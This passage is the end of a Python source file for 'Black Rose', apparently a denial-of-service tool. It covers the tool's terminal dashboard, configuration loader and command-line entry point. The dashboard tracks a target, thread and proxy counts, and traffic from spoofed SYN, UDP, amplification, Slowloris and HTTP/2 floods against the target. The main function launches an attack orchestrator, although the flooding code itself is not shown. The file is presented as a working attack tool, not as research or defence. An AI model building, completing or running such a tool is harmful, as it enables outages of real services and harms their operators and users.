▒░▒   ░ ░ ░ ▒  ░ ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░     ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒  ░ ░ ░ ░  ░
 ░    ░   ░ ░    ░   ▒   ░        ░ ░░ ░      ░░   ░ ░ ░ ░ ▒  ░  ░  ░     ░   
 ░          ░  ░     ░  ░░ ░      ░  ░         ░         ░ ░        ░     ░  ░
      ░                  ░                                                    

"""
        title = Text(banner_text, justify="center", style="bold deep_pink2")
        sub_title = Text(f"Overload Protocol Engaged || Forged by Amir Masoud", justify="center", style="bold gold1")
        grid = Table.grid(expand=True); grid.add_column(); grid.add_row(title); grid.add_row(sub_title)
        return Panel(grid, style="bold red", border_style="red", box=box.HEAVY)
    def _get_left_panel(self, snapshot):
        master_table = Table(show_header=False, box=None, padding=(0,1)); master_table.add_column(style="bold gold1", width=18); master_table.add_column(style="white")
        master_table.add_row("Target:", f"[cyan]{self.target_info['hostname']}:{self.target_info['port']}[/cyan] ({self.target_info['host']})")
        master_table.add_row("Duration:", f"{int(snapshot['elapsed'])}s / {self.config['duration']}s")
        master_table.add_row("Threads:", f"{self.config['threads']:,}")
        proxy_count = self.orchestrator.proxy_manager.proxies.qsize()
        active_str = "ACTIVE" if proxy_count > 0 else "INACTIVE"; proxy_style = "green" if proxy_count > 0 else "red"
        master_table.add_row("Proxy System:", f"[{proxy_style}]{active_str} | {proxy_count:,} Live Proxies[/{proxy_style}]")
        mix_table = Table(title="Attack Mix", show_header=False, box=box.MINIMAL, padding=(0,1)); mix_table.add_column(style="cyan"); mix_table.add_column(style="white", justify="right")
        for k, v in self.config['attack_mix'].items():
            if v > 0: mix_table.add_row(f"{k}:", f"{v}%")
        grid = Table.grid(expand=True); grid.add_column(); grid.add_row(master_table); grid.add_row(mix_table)
        return Panel(grid, title="[bold red]Master Control[/bold red]", border_style="red", box=box.ROUNDED)
    def _get_right_panel(self, snapshot):
        m = snapshot['metrics']; stats_table = Table(show_header=False, box=None); stats_table.add_column(style="green", no_wrap=True, width=20); stats_table.add_column(style="white", justify="right")
        stats_table.add_row("Total Operations/s", f"{int(snapshot['ops']):,}")
        stats_table.add_row("Successful Ops", f"[green]{m['success']:,}[/green]"); stats_table.add_row("Failed Ops", f"[red]{m['failed']:,}[/red]")
        vector_table = Table(title="Live Vector Output", show_header=False, box=box.MINIMAL, padding=(0,1)); vector_table.add_column(style="cyan", no_wrap=True); vector_table.add_column(style="white", justify="right")
        vector_map = {"L7 Requests": m.get('requests', 0), "H2 Streams": m.get('h2_streams', 0), "Slowloris Sockets": m.get('slowloris_sockets', 0), "Spoofed SYN Pkts": m.get('syn_pkts', 0), "UDP Pkts": m.get('udp_pkts', 0), "Amplification Pkts": m.get('amp_pkts', 0)}
        for name, value in sorted(vector_map.items(), key=lambda item: item[1], reverse=True):
            if value > 0: vector_table.add_row(f"{name}:", f"{value:,}")
        ops_spark = create_text_sparkline(snapshot['ops_spark'], length=25); bps_sent_spark = create_text_sparkline(snapshot['bps_sent_spark'], length=25); bps_impact_spark = create_text_sparkline(snapshot['bps_impact_spark'], length=25)
        grid = Table.grid(expand=True); grid.add_column(); grid.add_row(stats_table); grid.add_row(vector_table)
        grid.add_row(Text("\nBandwidth (Sent from You)", justify="center", style="bold blue")); grid.add_row(Align.center(Text(f"{bps_sent_spark} {self.format_bytes(snapshot['bps_sent'])}", style="blue")))
        grid.add_row(Text("\n[bold red]Bandwidth (Estimated Impact on Target)[/bold red]", justify="center")); grid.add_row(Align.center(Text(f"{bps_impact_spark} {self.format_bytes(snapshot['bps_impact'])}", style="bold red")))
        return Panel(grid, title="[yellow]Overall Telemetry & Target Impact[/yellow]", border_style="yellow", box=box.DOUBLE_EDGE)
    def format_bytes(self, b):
        if b < 1024: return f"{b:,.2f} B/s"
        if b < 1024**2: return f"{b/1024:,.2f} KB/s"
        if b < 1024**3: return f"{b/1024**2:,.2f} MB/s"
        if b < 1024**4: return f"{b/1024**3:,.2f} GB/s"
        return f"{b/1024**4:,.2f} TB/s"
    def run_display(self):
        progress = Progress(TextColumn("[bold blue]Time Remaining:", justify="right"), BarColumn(bar_width=None), "[progress.percentage]{task.percentage:>3.0f}%", TimeRemainingColumn())
        task_id = progress.add_task("duration", total=self.config['duration'])
        with Live(self.layout, screen=True, auto_refresh=False, vertical_overflow="visible") as live:
            while not STAY_ALIVE.is_set() and not progress.finished:
                self.orchestrator.stats.update_telemetry(); snapshot = self.orchestrator.stats.get_snapshot()
                self.layout["header"].update(self._get_header()); self.layout["left"].update(self._get_left_panel(snapshot))
                self.layout["right"].update(self._get_right_panel(snapshot)); self.layout["progress"].update(progress)
                self.layout["footer"].update(Text(f"Black Rose v{VERSION} | Press Ctrl+C to stop.", justify="center", style="dim"))
                progress.update(task_id, completed=snapshot['elapsed']); live.update(self.layout, refresh=True); time.sleep(0.5)

def load_config():
    config = DEFAULT_CONFIG.copy()
    if os.path.exists(DEFAULT_CONFIG_PATH):
        logger.info(f"Loading configuration from {DEFAULT_CONFIG_PATH}")
        with open(DEFAULT_CONFIG_PATH, 'r') as f:
            try:
                user_config = json.load(f)
                for key, value in user_config.items():
                    if isinstance(value, dict) and key in config: config[key].update(value)
                    else: config[key] = value
            except json.JSONDecodeError: logger.error(f"Invalid JSON in {DEFAULT_CONFIG_PATH}. Using defaults.")
    else:
        logger.info("No config.json found, creating one with default settings.")
        with open(DEFAULT_CONFIG_PATH, 'w') as f: json.dump(DEFAULT_CONFIG, f, indent=4)
        if not os.path.exists('files'): os.makedirs('files')
    return config

def main():
    parser = argparse.ArgumentParser(description=f"Black Rose v{VERSION} - Overload Protocol by Amir Masoud", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("-t", "--target", help="Target URL. Overrides config.")
    parser.add_argument("-d", "--duration", type=int, help="Duration in seconds. Overrides config.")
    parser.add_argument("-th", "--threads", type=int, help="Number of threads. Overrides config.")
    parser.add_argument("-p", "--proxies", type=str, help="Path to proxy file. Overrides config.")
    args = parser.parse_args()

    config = load_config()
    if args.target: config['target'] = args.target
    if args.duration: config['duration'] = args.duration
    if args.threads: config['threads'] = args.threads
    if args.proxies: config['proxies']['proxy_file'] = args.proxies

    logger.remove(); logger.add(sys.stderr, level=config['logging']['level'].upper()); logger.add(config['logging']['file'], level=config['logging']['level'].upper(), rotation="10 MB", compression="zip", enqueue=True)
    orchestrator = AttackOrchestrator(config); ui = UIManager(config, orchestrator)
    attack_thread = threading.Thread(target=orchestrator.unleash_vengeance, daemon=True)
    try:
        attack_thread.start(); ui.run_display()
    except KeyboardInterrupt: logger.warning("\nShutdown signal received from user. Terminating...")
    except Exception as e: logger.critical(f"A critical error occurred in the main loop: {e}", exc_info=True)
    finally:
        orchestrator.ceasefire(); time.sleep(1)
        CONSOLE.print("\n[bold green]Black Rose has ceased operations. The digital silence returns.[/bold green]")
        CONSOLE.print("[bold red on white] OVERLOAD PROTOCOL TERMINATED. [/bold red on white]")

if __name__ == "__main__":
    main()
